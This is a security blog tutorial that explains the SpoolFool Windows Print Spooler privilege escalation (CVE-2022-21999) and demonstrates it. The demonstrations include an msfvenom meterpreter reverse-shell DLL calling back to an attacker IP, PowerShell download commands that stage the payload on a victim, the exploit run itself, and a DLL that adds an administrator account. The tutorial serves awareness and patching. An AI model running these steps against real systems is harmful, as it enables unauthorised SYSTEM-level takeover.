@@ -1,0 +1,139 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Privilege Escalation: SpoolFool</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-spoolfool/" rel="bookmark"><time class="entry-date published" datetime="2022-02-16T11:25:51+00:00">February 16, 2022</time><time class="updated" datetime="2025-05-10T20:27:45+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <h3><span style="color: #800000;">Introduction</span></h3>
+<p><span style="color: #000000;">Oliver Lyak posted a <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81">write-up</a></strong></span> about a Windows Privilege Escalation vulnerability that persisted in Windows systems even after patching of previous vulnerabilities in Print Spooler CVE-2020-1048 and CVE-2020-1337. Oliver was assigned CVE-2022-21999 for this vulnerability and commonly named it “SpoolFool.” In this article, we will discuss the technical details associated with the same and demonstrate two methods through which an attacker can leverage and gain escalated privileges as NT AUTHORITY\SYSTEM.</span></p>
+<p><span style="color: #000000;">Related advisories: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21999</span></p>
+<p><span style="color: #000000;">Related CVEs: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21999">CVE-2022-21999</a></strong></span>, <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1030">CVE-2020-1030</a></strong></span>, <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1337">CVE-2020-1337</a></strong></span>, <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1048">CVE-2020-1048</a></strong></span></span></p>
+<h3><span style="color: #800000;">Summary of the Vulnerability</span></h3>
+<p><span style="color: #000000;">The vulnerability allows an unprivileged user to create arbitrary and writeable directories by configuring the SpoolDirectory attribute on a printer. Since an unprivileged user is allowed to add remote printers, an attacker can create a remote printer and grant EVERYONE the right to manage this printer. This would return a handle with PRINTER_ACCESS_ADMINISTER right which can be further used to perform tasks such as DLL injection.</span></p>
+<h3><span style="color: #800000;">Print Spooler Basics</span></h3>
+<p><span style="color: #000000;">Print spooler is the primary printing process interface. It is a built-in EXE file that is loaded at system startup itself. The workflow of a printing process is as <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/print/introduction-to-spooler-components">follows</a></strong></span>:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgzRjHIgyikNwAhv9i5Atndlje5cJxTUg6X4QsfFbB7kWT7EnPL129UqZNmeE9bdjGni9LKNkeJ5jgF4fErgPcpncHU654ttNxANwXkYGaR8hIBqr-ELnWE2LM3c6ZtNXAO1IVsD8-p31_lHaQw2AS41eEPDBU5H1RUPkoVBGe9XlsRbcEzSLOE1DLCyg=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Application</strong>: The print application creates a print job by calling Graphics Device Interface (GDI).</span></p>
+<p><span style="color: #000000;"><strong>GDI</strong>: GDI includes both user-mode and kernel-mode components for graphics support.</span></p>
+<p><span style="color: #000000;"><strong>winspool.drv</strong> is the interface that talks to the spooler. It provides the RPC stubs required to access the server.</span></p>
+<p><span style="color: #000000;"><strong>spoolsv.exe</strong> is the spooler’s API server. This module implements message routing to print provider with the help of router (spoolss.dll)</span></p>
+<p><span style="color: #000000;"><strong>spoolss.dll</strong> determines which print provider to call, based on a printer name and passes function call to the correct provider.</span></p>
+<h3><span style="color: #800000;">Spool Directory</span></h3>
+<p><span style="color: #000000;">When a user prints a document, a print job is spooled to a predefined location referred to as the spool directory. The default location is <strong>C:\Windows\System32\spool\PRINTERS. This directory is by default writeable by everyone as everyone uses the printer (FILE_ADD_FILE permission. Read more <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/fileio/file-access-rights-constants">here</a></span>), and the Spool Directory is configurable on each printer.</strong></span></p>
+<h4><span style="color: #000000;">Workflow of the CVE 2020-1030</span></h4>
+<p><span style="color: #000000;">I would highly recommend reading Victor Mata’s post <span style="color: #0000ff;"><strong>here </strong></span>before trying to demonstrate the vulnerability yourself. But for people who don’t like to get into too much technicality, here is a summary of how the vulnerability shall be exploited.</span></p>
+<h5><strong><span style="color: #000000;">Default Printer Permissions</span></strong></h5>
+<ul>
+<li><span style="color: #000000;">By default, users can add printers without administrator authentication needed.</span></li>
+<li><span style="color: #000000;">Calling AddPrinter returns a printer <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/handles-and-objects">handle</a> </strong></span>(I recommend reading what handles are if you have less idea of development) with the <strong>PRINTER_ALL_ACCESS right. </strong>This grants printing rights to standard and administrative print operations.</span></li>
+</ul>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEipsvNes1iInJTnQmIPewRtQsg6Pl4NoiYmq1_fk8i8NoaG702Z7dPhV1g4WqSCL4SDqUvmNE0XtO5wk17IymRj-KFfVamGcYSe1PzoUvkIC_ihzV8uCKWsQdNGvl85OO4_vRUvMbgNLl2nK_GGo63MK3rdG5peu6zmfhLUx7-b-CwsM4llak7MMnV2AA=s16000"/></p>
+<ul>
+<li><span style="color: #000000;">However, the caller of the AddPrinter function must have <em><strong>SERVER_ACCESS_ADMINISTER</strong></em> right to the server on which the printer is to be created.</span></li>
+<li><span style="color: #000000;">An unprivileged user will not have these rights and hence, can’t add a new printer with <strong>PRINTER_ALL_ACCESS right.</strong></span></li>
+</ul>
+<h5><span style="color: #000000;">The Role of the INTERACTIVE Group</span></h5>
+<ul>
+<li><span style="color: #000000;">The “INTERACTIVE” group has the manage server permissions enabled which correspond to</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjNCSl-n_Ezy-4PpHM_J-PbTTa3ufPHLAyiViUhzW_TKnolUbaxfGv1cxgG1fPoACkYy1VHK4R-9ipE2_M4qK2gY4m_pVHdRvL-PkrjEoAC77sTocqBHPA256akst8eoGr-xDvQvcQpHSKLSnMK8b1o_iQKzJydN0k_JVZ4Ej61zDHWcy7v3_e2pG4Aew=s16000"/></span></p>
+<ul>
+<li><span style="color: #000000;">The <strong data-start="1361" data-end="1376">INTERACTIVE</strong> group has manage server permissions enabled, which allows its members to add a printer with <strong data-start="1469" data-end="1497">SERVER_ACCESS_ADMINISTER</strong> rights.</span>
+<ul>
+<li><span style="color: #000000;"><strong>INTERACTIVE GROUP: </strong>SID S-1-5-4 NT Authority\Interactive is a system group that gets automatically added when a user logs on to the system locally or via RDP. Removing this group would mean restricting logging access in older systems, however, in newer Windows, it gets re-added on restart. In short, it symbolizes an actual physical user that is interacting with the machine. This group is absent on Active Directory systems as permissions are only managed by DC in such environments.</span></li>
+<li><span style="color: #000000;">Therefore, the attack was not found to be working with service accounts (like IIS or MSSQL$)</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;">Thus, if the user running the exploit is a member of <strong data-start="1767" data-end="1782">INTERACTIVE</strong>, <strong data-start="1784" data-end="1798">AddPrinter</strong> will return a handle with <strong data-start="1825" data-end="1847">PRINTER_ALL_ACCESS</strong> rights. This handle can be used to modify the spool directory.</span></li>
+</ul>
+<h5><strong><span style="color: #000000;">Modifying the Spool Directory</span></strong></h5>
+<p><span style="color: #000000;">In C#, <strong>SetPrinterDataEx</strong> function can modify spool directory. Here, we are creating a directory <strong>C:\Windows\System32\spool\drivers\x64\4</strong></span><br/>
+<span style="color: #000000;">To create this spool, we have the necessary rights PRINTER_ALL_ACCESS (returned to the handle hPrinter)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiPYSMrIHzpupvTZgUJqbb_TwgOLUSdoGozIwWgbaJiZz-YVvS-SvWzdwcMGyHuVA8A4zb_R6SQteF-CYExoMJXsamkbgFFBQ_CafyKeIoO_Ol84aZJRD9HAhpksP_wFv0MnaJ1ALgfNuuXd4o3H7srKAeVpxFTdsStTvwg6Q7UtXk9_WeMZPLPg6lphg=s16000"/></span></p>
+<p><span style="color: #000000;">As you can see the intended directory in the pszData variable doesn’t exist already.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4U1ar501WL-g2lcEDv0lpKyoFDvhgmIealdkwFt_9BycQ2PCkNL2UsPkfqdtlKdilE55UIyMwXJm5Egf_AqAAqnj24sfErE_iH_1OGe7aHoChE4FlBBI7WGGockRJX3h8-jeXNOXnBK0fSaiGwzHI2YZRTQ29YD7SlbSUMDO2tMnJoi5mZlbeIHmbKQ=s16000"/></span></p>
+<ul>
+<li><span style="color: #000000;">Re-initialize the print spooler service by calling AppVTerminator.dll</span></li>
+<li><span style="color: #000000;">Spool Directory C:\Windows\System32\spool\drivers\x64 created with write permissions to EVERYONE.</span></li>
+<li><span style="color: #000000;">A malicious DLL is created and loaded in that directory. It gets validated and CopyFiles\\ will trigger that DLL and load it into the printer process (spoolsv.exe)</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiJv3jyQuITxv1sAULxrhXkPiPhoDhMkTcKK8c0m9wFYhGU904wtLn8dcl28yZpLidwQG-19Q0hNoYylIPb9W2ah7HjdkCPOvnZ85owcmufJBW3v8j29PFKjUoptjeN4aMavP0w_-djfw-B49lBJ-qTnUWMszAiXV6196D69Z6m9Sjdj1ds0LbiPtBdog=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Diagramatic Workflow of CVE 2020-1030</strong></span></h3>
+<p><span style="color: #000000;">It could be understood in simpler terms like this:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjq9LpYFT2U6NAKfqKdaJNHTRyRvSuZHXRE3wN2W6nNQsMkubzYvJJBtPIfDnhltWODy0m0Ul2ALeYxM01ogu6ChDFvp9EcXNbWG0zYntduEOuoDZE7Z7BpghDto6mUXXmuwPXnfGWIEktkY8I8ufEG-_JX8bRs3tlttw2YtzTgi4lsTzfgjNV58ecnxg=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Incoming CVE 2022-21999</strong></span></h3>
+<p><span style="color: #000000;">After the issue was patched by Microsoft, Oliver Lyak in his post <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81">here</a> </strong></span>mentions Microsoft’s patches and how he circumvented them. Thus, he proposed the following two enhancements for this vulnerability patch and was assigned CVE 2022-21999:</span></p>
+<ol>
+<li><span style="color: #000000;">He states that a user not in the INTERACTIVE group can still add a remote printer and gain PRINTER_ACCESS_ADMINISTER rights.</span></li>
+</ol>
+<p><span style="color: #000000;"><em>“</em><em>If a user adds a remote printer, the printer will inherit the security properties of the shared printer from the printer server. As such, if the remote printer server allows EVERYONE to manage the printer, then it’s possible to obtain a handle to the printer with the </em><em>PRINTER_ACCESS_ADMINISTER</em><em> access right, and SetPrinterDataEx would update the local registry as usual”</em></span></p>
+<ol start="2">
+<li><span style="color: #000000;">Microsoft added directory creation/access validation on the user level to restrict the creation of spool directories. So, in his exploit, he used <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/fileio/reparse-points">reparse</a> </strong></span>Basically, the following things happen:</span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">We create a temporary directory (C:\TEMP\xyzxyzxyz) and set it as SpoolDirectory</span></li>
+<li><span style="color: #000000;">The validation set by Microsoft gets passed and SpoolDirectory is set to this temporary directory.</span></li>
+<li><span style="color: #000000;">Configure this temporary directory as a reparse point which points to C: \Windows\System32\spool\drivers\x64\</span></li>
+<li><span style="color: #000000;">SetPrinterDataEx is called with CopyFiles and DLL in this directory gets automatically loaded into the process spoolsv.exe</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Why only C:\Windows\System32\spool\drivers\x64 ? =&gt; </strong>This is the printer driver directory. Point and Print is a printer sharing technology designed for driver distribution. In Point and Print, installation is extendable with a custom Point and Print DLL.</span></p>
+<p><span style="color: #000000;">When CopyFiles\\ is used with SetPrinterDataEx, it initiates a sequence of Point and Print. If the directory specified is a Printer Driver Directory, Point and Print is triggered and the DLL placed in this is loaded to the existing process spoolsv.exe</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4a4U-KVOKnnzutQ3nDUGgdyK8zK3gXKZ6HKYvcU2DwB4i9mGBPt13FW4aSGX30cba64vUdorqDGtDTYupFCgYsDh6AHp-8PEJjA7P3uJLoZVIlL70eXlNIBuK9XIJEmmOW7z2CAIueSNodziBLFrCypDYaxIFZtO8LZj-A60bZp9q_8Emz4igh4tk9Q=s16000"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Demonstration – Method 1</strong></span></h3>
+<p><span style="color: #000000;">For the demonstration, we will use the original PoC created by Oliver Lyak which could be downloaded from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/ly4k/SpoolFool">here</a></strong></span>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/ly4k/SpoolFool
+cd SpoolFool
+ls</pre>
+<p><span style="color: #000000;">As you may observe, the PoC comes with an EXE file and a pre-made DLL payload.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEisBtWQJfgoiCqudMXU3cuc9whB-Brx_z6W_lKrIUA4DwQkDSy5BCuLPvp12jITYD0q5g_Bwf0Dk5gs74h_NVcJbkJX3SCDrtNDDw9BEW0uu3rORdO9uFpEob7COsnEXLV4Y737qC3Ota4KbWrUSVTQTnshfAa9rXDHkHnIp6Fej87ckTVMtH-nDYvVPQ=s16000"/></span></p>
+<p><span style="color: #000000;">First, we compromise the system and gain a reverse shell. As you can see, a user hex has been compromised and NT AUTHORITY\INTERACTIVE exists on the system. If hex has a local account (not applicable on domain accounts), he is by default a member of this group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami /user /groups</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjBVG72f-J7x-gL54_vT39sLS7ubX7TiuS2KgD6XvBuEmcN3hBBLXShF8B2s971K7_B5A6KaYOz2psVWeaOQzWW03p_aCdV4uQ4f6cKVhAcwBWg-B8-hunj0kfgSauVcO7UTwrd05Imknb0MDRmtnTsBxVw2id0zb9HO5Cj4puZqbDRqDz2fsWg0IelRQ=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we shall create our own custom DLL first using msfvenom. I’m using a meterpreter injection as payload but the choices are numerous.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=192.168.0.20 LPORT=9501 &gt; reverse_64bit.dll</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg0xTpxvj14x3iaetMQCF-uGFZvb0sxen_T-xBYPr1y-VhESMNyvWvLJfiXu-sufy-9E_v_D8Tmtc2bgP2KYB-uFxzAXuUHNtpTp-L36y348jPXJKD0ExruUHMIWJbl2KR0NJLeNwZDvFNwsRbql09whP7vFlKVXlNh38ByXLW5C4bgyfvrfX2xdda1QQ=s16000"/></span></p>
+<p><span style="color: #000000;">We just need to upload this on our victim machine. I recommend C:\Users\Public. You can start a python server and host SpoolFool.exe and reverse_64bit.dll files in the same location. This can be done using powershell module IWR</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -c iwr http://192.168.0.20/reverse_64bit.dll -outf \Users\Public\reverse.dll
+powershell -c iwr http://192.168.0.20/SpoolFool.exe -outf \Users\Public\SpoolFool.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjql1IOIhTAQpo_GfJCIzMe-VFAG1RHZh3qawjUdi-1Ztt5flA5XXPaTELuG7F711hV31obSl_ctdF5gWnBkHEpQBMMSPm7RqsU0ZQPBnC-79qpiEc7A8W5IS6m6bsPQCoXPAK83kwK5XerSMRgx1PR21vwNXHmAQTMhwk-8KYvjzHB_dp1nY7a7LGDtA=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we can run the exploit and load this DLL with the following command. Before running it, make sure to set up multi/handler in msfconsole.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">SpoolFool.exe -dll reverse.dll</pre>
+<p><span style="color: #000000;">Observe here, how a directory has been made in %temp%\d5f5….{random name} and a reparse point has been created to write into our desired print driver directory C:\Windows\system32\spool\DRIVERS\x64\4</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhd848JjHwdUzQ3vNtT8urPmPShKFd0hWmz7lsTj3oRACF79FxTaPlacJ7QXA39_vyzUMDqWapz1KK1rPiSLUpxw79MInJqNl5e9U-mzOwJni_1pHrbIPL_YdShK6BaTk4Z5IAzHcHnObpDqGK4J61JansGp-52-epyW77plsqPtM8Vc2r4i1QrY46d1Q=s16000"/></span></p>
+<p><span style="color: #000000;">The directory didn’t exist before, but now you can see, it exists and the DLL has been saved in here. Which means success! The directory is also writable by everyone.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi9wK9ITrDu_74okUkDHC1bAR89V81bK3MuQI2hgMOTUJ0syM3wArRF-jQCY8DXxcoEztkzFrHpE71hYUx83IkH_3Xhieu1USqWSL2-WWKL_5knq2CArCFMDjO1CnuxIBCUmekifUj8CVCcklftOOjT0s_lbKaREaipgmdImxAW2XSJWR22pT5h_OY_lw=s16000"/></span></p>
+<p><span style="color: #000000;">Anyhow, the DLL is now loaded and we have received a reverse shell!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.20
+set LPORT 9501
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgMOfJfn9f9bYCIHCJw1pUo4kWRZ_ywAY9jIJ4VrR8F3k0WbUBdnasv-hdQDUbV2KcKrvCVBiq4Ea2pYpK8m1V87olKAFbasomCxL70CDbESJNn960w58RmholAIhqcdwxaBVL53DR0o_vFPXew64sfLUtiBVUGYIliUMXfX2bKi-9gtt8V4Ou_PVhUrQ=s16000"/></span></p>
+<p><span style="color: #000000;">We can check the current user’s permissions and as you can see, privileges have been escalated!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi32rlvXa59D_RDndRZNYCWjSbEdc0SKmWnuIiKUYaTVE_N_ONt_0ZYKp5u8y6H6MkuPDc_G4ZDjNOlFwF8B5skPIKh7n8Qc3_FIhxZm0gbmUiFrvuCGn3OVg0ruVxuLeBjCeLMlwZ1DEUhXtlZvO-f56zcMokYu5oF6Um7NMq_e5qKKavx_B5heh38mA=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Demonstration – Method 2</strong></span></h3>
+<p><span style="color: #000000;">Author has already created a DLL called AddUser.dll in the project directory that would allow us to add a new user called “admin” with Administrator privileges and the default password “Passw0rd!”</span></p>
+<p><span style="color: #000000;">Let’s compromise our victim again and see his own membership.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami
+net user hex</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh96eE7gJXuY-eg0bhjvyzy-4akTZy6TSRBX8FnCKZlO1vhLIHDwwLjEfvBHnQzGFuIJ1Z7mlEfBaZ5quLTjZDz2xlGGET1ce6cwwmST5EXvRDdP5eNtsTQtpElEbTcYCtW4hW3b1gEq3FuYWS-1Ho78SnwPWZ7JCfQUIZdxyvxXv3AbWmhR_thLn6Y4Q=s16000"/></span></p>
+<p><span style="color: #000000;">Hex user doesn’t have administrator access. Now, we run the SpoolFool.exe exploit again but include this DLL this time.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">SpoolFool.exe -dll Adduser.dll</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiBYy-zodbDVdSIDCAiCLtE6unfj77KFQdkTiulIaknCBeFzrD3upFs2l-uo_rQHYygQwtUZ47nHzXdknJ3fREa4pLmJaIIZ6Ps0aQBrCcm-ZRxtj7uKU2oz5WY_KoAPupHr0llEBThN-37yQZv-5e4uurXlRfzPnrHlW6tMYyAYconqi1H_Js5F01Mpw=s16000"/></span></p>
+<p><span style="color: #000000;">Now, upon checking users, we can see an admin user has been added who is a part of Administrators!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user
+net user admin</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjv0EcjitLbVC6XOG5aWkSS9DmZRc0AjQPwNmH-A7vP0e6wHuROYohcnnZojO3x2WxclkAT3Yse-FVMafC9dfqCS1p6nZarTJAMJF4a9jpXr0y-ky2cP-TPwDiD_Wc5ma2NQlrJgJK25YAujtD8U62b5mny6nW7clmp7YIifPd3qc87QjcdBBc4Gzz6Eg=s16000"/></span></p>
+<p><span style="color: #000000;">We can now use these <strong data-start="146" data-end="161">credentials</strong> to do a number of things! For example, we can <strong data-start="208" data-end="217">login</strong> using <strong data-start="224" data-end="234">psexec</strong>, or <strong data-start="239" data-end="248">login</strong> via <strong data-start="253" data-end="260">RDP</strong>, among other options. I also tried a simple <strong data-start="305" data-end="324">smbclient shell</strong> to check the validity of the credentials. As you can see, <strong data-start="383" data-end="397">privileges</strong> have escalated, and we can now interact with the victim as an admin!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiKIiHpdQrHdsOEW0tSFv-SYGP6zg8kVIQ4t5cLk1b_9Hk8U6LOm-OrixrWzcrZGdgF6iv5VXJKPXLF-DDTo9T421zirCA8IObXIVyOds33_xR-U1mmq58IQ7NTliruDos0aWsTdN0RexqF9VfCMB-8E_Hfke0UytrlFiRLWO2evTzTiA6xvEcRE4PKFA=s16000"/></span></p>
+<h3><span style="color: #800000;">Patch Status</span></h3>
+<p><span style="color: #000000;">As per the author: A quick check with Process Monitor reveals that the Spool Directory is no longer created when the Spooler initializes. If the directory does not exist, the Print Spooler falls back to the default spool directory.</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;"><strong data-start="473" data-end="505">Windows privilege escalation</strong> has always been tricky from a pentester’s point of view. However, <strong data-start="572" data-end="596">Print Spool exploits</strong> have successfully debunked that notion. Notably, the <strong data-start="650" data-end="690">arbitrary file writing vulnerability</strong> has been marked as <strong data-start="710" data-end="720">SEVERE</strong> by the <strong data-start="728" data-end="755" data-is-only-node="">Microsoft MSRC bulletin</strong> because of how easily it can be exploited to escalate privileges. Through this article, we aim to spread awareness among <strong data-start="877" data-end="889">analysts</strong> and encourage them to update their <strong data-start="925" data-end="936">patches</strong> in a timely manner. I hope you found the article helpful. Thanks for reading, and feel free to connect with me on <strong data-start="1051" data-end="1063">LinkedIn</strong> if you have any queries.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
